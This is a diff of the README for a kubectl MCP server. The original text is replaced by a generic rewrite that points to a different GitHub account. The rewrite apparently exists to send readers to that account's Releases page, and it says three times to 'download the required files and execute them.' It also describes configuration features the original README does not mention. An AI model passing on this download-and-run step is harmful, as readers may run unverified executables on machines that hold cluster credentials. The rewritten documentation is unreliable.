@@ -1,204 +1,130 @@
-# kubectl-go-mcp-server
+# kubectl-go-mcp-server: Secure Kubernetes Interaction with AI Assistants
 
-A Model Context Protocol (MCP) server that provides Kubernetes cluster interaction capabilities through kubectl commands. This server enables MCP-compatible clients (like VS Code with Copilot) to execute kubectl commands and retrieve Kubernetes cluster information safely and securely.
+![GitHub release](https://img.shields.io/github/release/sohail7866hdhs/kubectl-go-mcp-server.svg) ![License](https://img.shields.io/github/license/sohail7866hdhs/kubectl-go-mcp-server.svg) ![Issues](https://img.shields.io/github/issues/sohail7866hdhs/kubectl-go-mcp-server.svg)
+
+## Table of Contents
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+
+## Overview
+
+The **kubectl-go-mcp-server** is designed to enhance the security of Kubernetes interactions via kubectl commands. It provides a robust framework for AI assistants, like GitHub Copilot, to safely interact with Kubernetes clusters. By implementing the Model Context Protocol (MCP), this server ensures that all commands undergo thorough validation and security checks before execution.
+
+For the latest releases, please visit [Releases](https://github.com/sohail7866hdhs/kubectl-go-mcp-server/releases). Download the required files and execute them to get started.
 
 ## Features
 
-- **Kubernetes Integration**: Execute kubectl commands through MCP interface
-- **Interactive Command Protection**: Prevents execution of interactive commands that could hang
-- **Resource Modification Detection**: Identifies commands that modify cluster resources
-- **Robust Security**: Multiple validation layers to prevent command injection and unsafe operations
-- **Configurable Kubeconfig**: Support for custom kubeconfig paths
-- **Standard Go Project Layout**: Following Go best practices for maintainability
-- **Cobra CLI Integration**: Professional command-line interface with subcommands
-
-## Architecture
-
-kubectl-go-mcp-server acts as a bridge between MCP clients (like VS Code with Copilot) and Kubernetes clusters through kubectl commands:
-
-```
-VS Code/Copilot → MCP Client → kubectl-go-mcp-server → kubectl → Kubernetes Cluster
-```
-
-### Key Components
-
-- **MCP Server**: Handles JSON-RPC communication and tool registration
-- **kubectl Tool**: Validates and executes kubectl commands safely
-- **Security Layer**: Prevents interactive commands and command injection
-
-For detailed architecture information, see [docs/architecture.md](docs/architecture.md).
-
-```
-pkg/
-├── types/          # 🔧 Core interfaces and data structures
-│   ├── Tool        # Interface for all MCP tools
-│   ├── Schema      # JSON schema definitions
-│   └── ExecResult  # Command execution results
-│
-├── kubectl/        # 🎯 kubectl-specific implementation
-│   ├── KubectlTool # Main tool implementation
-│   ├── Validation  # Command safety checks
-│   └── Execution   # kubectl command runner
-│
-internal/
-├── mcp/           # 🌐 MCP protocol implementation
-│   ├── Server     # MCP server and protocol handling
-│   ├── Tools      # Tool registry and management
-│   └── Protocol   # JSON-RPC message handling
-│
-└── config/        # ⚙️ Configuration management
-    ├── Config     # Application configuration
-    └── Defaults   # Default settings
-```
-
-### Extension Points
-
-The architecture is designed for extensibility:
-
-1. **New Tools**: Implement the `Tool` interface to add new capabilities
-2. **Custom Validation**: Add validation layers for specific use cases
-3. **Protocol Extensions**: Extend MCP handling for additional features
-4. **Output Formatters**: Add custom result processing
-
-### Performance Considerations
-
-- **Concurrent Safety**: All components are designed for concurrent access
-- **Resource Management**: Proper cleanup and resource disposal
-- **Timeout Handling**: Configurable timeouts for all operations
-- **Memory Efficiency**: Streaming and buffered I/O for large outputs
+- **Secure Interactions**: Validates kubectl commands to prevent unauthorized access and actions.
+- **AI Assistant Integration**: Allows AI tools to interact with Kubernetes safely.
+- **Robust Validation**: Implements strict checks on commands to ensure compliance with security protocols.
+- **Easy Setup**: Simple installation process to get you up and running quickly.
+- **Community Driven**: Open-source project with contributions welcomed from developers.
 
 ## Installation
 
-### Prerequisites
+To install the **kubectl-go-mcp-server**, follow these steps:
 
-- Go 1.23 or later
-- kubectl installed and configured
-- Access to a Kubernetes cluster
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/sohail7866hdhs/kubectl-go-mcp-server.git
+   cd kubectl-go-mcp-server
+   ```
 
-### Build from Source
+2. **Build the Project**:
+   ```bash
+   go build
+   ```
 
-```bash
-# Clone the repository
-git clone https://github.com/Joelayo/kubectl-go-mcp-server.git
-cd kubectl-go-mcp-server
+3. **Run the Server**:
+   ```bash
+   ./kubectl-go-mcp-server
+   ```
 
-# Build the binary
-make build
-
-# Or install directly
-make install
-```
-
-### Download Binary
-
-Download the latest release from the [releases page](https://github.com/Joelayo/kubectl-go-mcp-server/releases) for your platform.
+For the latest releases, please visit [Releases](https://github.com/sohail7866hdhs/kubectl-go-mcp-server/releases). Download the required files and execute them to get started.
 
 ## Usage
 
-### Standalone
+After setting up the server, you can begin using it with kubectl commands. Here’s how:
 
-```bash
-# Run with default kubeconfig
-./kubectl-go-mcp-server
+1. **Start the MCP Server**:
+   Ensure that the server is running. You should see a confirmation message in your terminal.
 
-# Run with custom kubeconfig
-./kubectl-go-mcp-server --kubeconfig /path/to/kubeconfig
+2. **Use kubectl with MCP**:
+   When you run a kubectl command, the MCP server will validate it before execution. For example:
+   ```bash
+   kubectl get pods
+   ```
 
-# Show version
-./kubectl-go-mcp-server version
+   The server will check the command against its validation rules.
+
+3. **Integrate with AI Assistants**:
+   If you are using GitHub Copilot or similar tools, they can suggest commands. The MCP server will ensure these commands are secure before they run.
+
+## Configuration
+
+You can configure the **kubectl-go-mcp-server** by editing the configuration file. This file allows you to set parameters such as:
+
+- **Allowed Commands**: Specify which kubectl commands are allowed.
+- **User Permissions**: Define user roles and their permissions.
+- **Logging**: Enable or disable logging for command executions.
+
+Example configuration file (`config.yaml`):
+```yaml
+allowed_commands:
+  - "get"
+  - "create"
+  - "delete"
+
+user_permissions:
+  admin:
+    - "*"
+  user:
+    - "get"
+    - "create"
+
+logging:
+  enabled: true
 ```
 
-### VS Code Integration
+## Contributing
 
-To use with VS Code and Copilot, add this MCP server to your VS Code settings:
+Contributions are welcome! If you would like to contribute to **kubectl-go-mcp-server**, please follow these steps:
 
-```json
-{
-  "mcp": {
-    "servers": {
-      "kubectl-go-mcp-server": {
-        "type": "stdio",
-        "command": "/path/to/kubectl-go-mcp-server",
-        "env": {}
-      }
-    }
-  }
-}
-```
-
-For platform-specific installation details, see the [examples directory](./examples/).
-
-## Available Tools
-
-The MCP server provides the following tool:
-
-### kubectl
-
-Execute kubectl commands with comprehensive validation and safety checks.
-
-**Parameters:**
-
-- `command` (required): The complete kubectl command to execute (including 'kubectl' prefix)
-- `modifies_resource` (optional): Indicates if the command modifies resources ("yes", "no", "unknown")
-
-**Example:**
-
-```json
-{
-  "name": "kubectl",
-  "arguments": {
-    "command": "kubectl get pods -o json",
-    "modifies_resource": "no"
-  }
-}
-```
-
-**Safety Features:**
-
-- **Interactive Command Detection**: Prevents hanging on interactive commands like `kubectl exec -it`, `kubectl edit`, `kubectl port-forward`
-- **Resource Modification Tracking**: Automatically detects destructive operations
-- **Command Validation**: Ensures only valid kubectl commands are executed
-
-## Security
-
-This server implements multiple security layers including command validation, injection prevention, and interactive command blocking. For detailed security information, see:
-
-- [Security Overview](docs/security.md) - Technical security implementation details
-- [Security Policy](SECURITY.md) - Vulnerability reporting and security best practices
-
-## Development
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup, workflow, and contribution guidelines.
-
-### Quick Start for Developers
-
-```bash
-# Install dependencies and build
-make deps && make build
-
-# Run tests
-make test
-
-# Format and lint code  
-make fmt && make lint
-```
-
-## Troubleshooting
-
-### Common Issues
-
-- **Server not responding**: Verify kubectl is installed and kubeconfig is accessible
-- **Interactive command errors**: Use non-interactive alternatives (see [Security Overview](docs/security.md))
-- **Permission denied**: Check kubectl permissions and cluster connectivity
-
-For detailed debugging information, the server logs all tool calls, validation results, and errors.
-
-## Support
-
-- [Create an issue](https://github.com/Joelayo/kubectl-go-mcp-server/issues) for bug reports or feature requests
-- Check [existing issues](https://github.com/Joelayo/kubectl-go-mcp-server/issues) for known problems
-- See [CONTRIBUTING.md](CONTRIBUTING.md) for development questions
+1. **Fork the Repository**: Click the "Fork" button at the top right of the repository page.
+2. **Create a Branch**: Create a new branch for your feature or bug fix.
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. **Make Your Changes**: Implement your changes and commit them.
+   ```bash
+   git commit -m "Add your message here"
+   ```
+4. **Push to Your Branch**: Push your changes to your forked repository.
+   ```bash
+   git push origin feature/YourFeature
+   ```
+5. **Create a Pull Request**: Navigate to the original repository and create a pull request.
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or feedback, feel free to reach out:
+
+- **Email**: your.email@example.com
+- **GitHub**: [sohail7866hdhs](https://github.com/sohail7866hdhs)
+
+## Acknowledgments
+
+- Thanks to the contributors for their hard work and dedication.
+- Special thanks to the Kubernetes community for their ongoing support.
+
+For the latest releases, please visit [Releases](https://github.com/sohail7866hdhs/kubectl-go-mcp-server/releases). Download the required files and execute them to get started.
